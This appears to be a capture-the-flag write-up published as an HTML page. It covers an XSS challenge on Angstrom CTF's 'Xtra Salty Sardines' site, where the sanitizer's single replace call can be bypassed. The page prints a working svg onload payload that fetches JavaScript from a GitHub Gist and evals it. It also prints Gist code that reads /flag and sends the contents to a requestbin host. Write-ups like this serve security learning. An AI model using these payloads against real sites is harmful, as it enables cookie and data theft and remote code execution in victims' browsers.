@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>Xtra Salty Sardines Writeup - Angstrom CTF - pip uninstall pip</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, height=device-height" />
+        <link rel="stylesheet" href="../index.css" />
+        <link rel="stylesheet" href="./writeup.css" />
+    </head>
+    <body>
+        <div id="content-container">
+            <nav class="navbar">
+                <a href="../">Home</a>
+                <br />
+                <a href="https://ctftime.org/team/183045#writeup_list">Writeups</a>
+            </nav>
+            <div id="main-container">
+                <div id="header" role="heading" aria-level="1">
+                    <h1>Xtra Salty Sardines (Angstrom) - Writeup</h1>
+                </div>
+
+                <main>
+                    <div>
+                        <p>Apparently, the description shows admin bot can access <code>/flag</code>. The site's acronym makes me certain that the bot will visit an XSS payload and sends our flag somewhere.</p>
+                        <p>
+                            Let's start with the source code given to us. We can see that the site uses the <code>replace</code> method in JS to filter out common XSS tags and replace them their HTML entity counterparts, such as
+                            <code>&lt;</code>, <code>'</code>, etc.
+                        </p>
+                        <p>
+                          However, It doesn't use <code>replaceAll</code>, just <code>replace</code>. We can then use something such as this: <code>&lt;&lt;svg onload=alert(1)//&gt;&gt;</code>
+                        </p>
+                        <p>It does output an alert! It would be processed like this by the sanitizer: <code>&amp;lt;&lt;svg onload=alert(1)//&amp;gt;&gt;</code></p>
+                        <p>My XSS payload involved first creating a GitHub Gist, then fetching and evaluating its content. This was the code I created:</p>
+                        <code>&lt;&lt;svg onload=fetch("https://gist.githubusercontent.com/hKQwHW/56f7e2b3ace5c941971456588ce11e36/raw/969cb463ef37dc107fa9fedae36dd56ebf2d0275/ddd.js").then(function(a){a.text().then(function(b){eval(b)})})//&gt;&gt;</code>
+                      </code></pre>
+                        <p>
+                            To break it down, first, we need to get make sure that our first replacement of <code>&lt;</code> is used up, and that we can now create the payload with it. This will lead to the first two characters being
+                            evaluted as <code>&amp;lt;&lt;</code> - ok, now, I just used an <code>svg</code> tag because I recently watched a LiveOverflow video where he did it, and thought it would be a good idea. I then used
+                            <code>onload</code> to make this execute JS. I know I could have put this in quotes, but it would require unnecessary work to get over the XSS parser sanitizing the first instance of it - looking back, I could've
+                            just put all the characters that it sanitizes at the start of my sardine's name then make a simpler payload, but whatever.
+                        </p>
+                        <p>
+                            Anyways, the JavaScript will fetch my <code>https://gist.githubusercontent.com/hKQwHW/56f7e2b3ace5c941971456588ce11e36/raw/969cb463ef37dc107fa9fedae36dd56ebf2d0275/ddd.js</code> URL, then get the text content of
+                            it and evaluate it. However, the next issue will be the CORS of the sardines website. It doesn't allow sending cookies or other data to URLs outside of its domain. However, I found a simple solution to this, and
+                            that's to use query strings to put data inside.
+                        </p>
+                        <p>My full payload ended up following the steps of: 1) fetching the contents of /flag, then 2) sending it to a requestbin with the /flag contents as a query string.</p>
+                        <p>The Gist code ended up looking like this:</p>
+                        <pre>
+fetch("https://xtra-salty-sardines.web.actf.co/flag").then(function(a) {
+  a.text().then(owo => {
+    fetch(`https://requestbin.net/r/13rz3f9a?${owo}`, {
+      "mode": "no-cors"
+    })
+  })
+})
+                        </pre>
+                        <p>Once I sent my payload to the admin bot, I received the flag inside my requestbin! It's actf{those_sardines_are_yummy_yummy_in_my_tummy}</p>
+                    </div>
+                </main>
+            </div>
+        </div>
+    </body>
+</html>
